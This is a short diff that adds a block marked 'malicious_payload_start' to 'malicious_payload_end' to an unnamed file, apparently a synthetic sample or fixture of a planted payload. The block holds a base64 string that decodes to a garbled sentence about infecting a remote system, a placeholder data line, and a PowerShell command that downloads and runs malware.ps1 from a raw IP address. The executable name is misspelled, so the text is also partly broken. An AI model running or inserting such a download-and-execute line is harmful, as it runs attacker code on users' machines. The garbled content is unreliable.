@@ -1,0 +1,5 @@
+malicious_payload_start
+VGhpcyBpcyBhIHRlc3QgY29tcGxldGUgdGhhdCBpbmZlY3RzIHRoZSByZXF1ZXN0IGhlYWRlciBmZWF0dXJlcyBmb3IgdGhhdCByZW1vdGUgc3lzdGVtLg==
+base64encoded_data==  
+cmd=powerhsell.exe -Command "iex (iwr -useb 'http://198.18.128.192/malware.ps1')"
+malicious_payload_end
